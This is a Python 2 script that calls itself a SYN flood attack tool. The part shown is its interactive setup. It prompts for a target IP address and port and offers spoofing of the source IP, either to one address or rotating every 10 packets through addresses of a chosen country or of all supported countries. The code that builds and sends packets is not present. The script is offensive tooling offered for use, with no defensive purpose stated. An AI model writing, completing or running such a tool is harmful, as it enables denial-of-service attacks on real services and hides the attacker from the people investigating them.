#!/usr/bin/env python



def supcountries():
   supfile = 'supcountries.txt'
   supcountries = []   
   with open(supfile) as fp:
        for number,line in enumerate(fp):
            line = line.replace('\n', '')
            supcountries.append(line)
   if '' in supcountries:
      supcountries.remove('')   
   return supcountries


def definetarget():
  print 'Welcome to syn flood attack coded by HaCkEr5pReMe'
  print ''  
  print 'Please enter the target IP'
  destination = raw_input()
  print ''
  return destination

def defineporttarget():
    print 'Enter the portnumber on which you want to attack your target: '
    targetport = int(raw_input())
    print ''
    return targetport

def anonymizing_input(supcountries):
    import socket    
    print 'Do you want to anonymize your attack, enter Y or N'
    awnser_yn = raw_input()
    if(awnser_yn == 'N'):
      print ''     
      print 'No anonymization for your attack'
      hostname = socket.gethostname()
      yourIP = socket.gethostbyname(hostname)
      print 'Your unanonymized IP is: ' + yourIP
      return yourIP
   
    else:
      print ''      
      print 'Anonymization selected'
      print 'There are 3 anonymizing possibilies'
      print ''
      print '1: Input your one IP-adress you want to spoof to'
      print '2: Choose a country and we change the ip adress every 10 packages to another one of the chosen country' 
      print '3: Your IP-adress will change evrery 10 packages and all over the globe'
      print ''
      awnserchoice = raw_input('Input the number of your choice: ')
      
      if(awnserchoice == '1'):
         print ''
         print 'Your Choice: 1'
         print 'Input your IP-adress you want to spoof to'
         sourceip = raw_input()
         return sourceip
      
      if(awnserchoice == '2'):
         print ''
         print 'Your Choice: 2'
         print 'Supported countries till now ' + str(supcountries)
         print 'Input the country of your choice'
         awnsercountry = raw_input('')
         print ''
         awnsercountry = awnsercountry.replace(' ', '')
         print 'Selected Country ' + awnsercountry
         if(awnsercountry in supcountries):
           return(awnsercountry)
         
         else:
           print 'The Country of your choice is not supported.' 
           print 'Check your awnser on spelling and restart the script' 
      
      if(awnserchoice == '3'):
         print ''
         print 'Your Choice: 3'
         print 'Your sourceip will be switching through the supported countries: ' + str(supcountries)
         allcountrys = 'all'
         return allcountrys
 




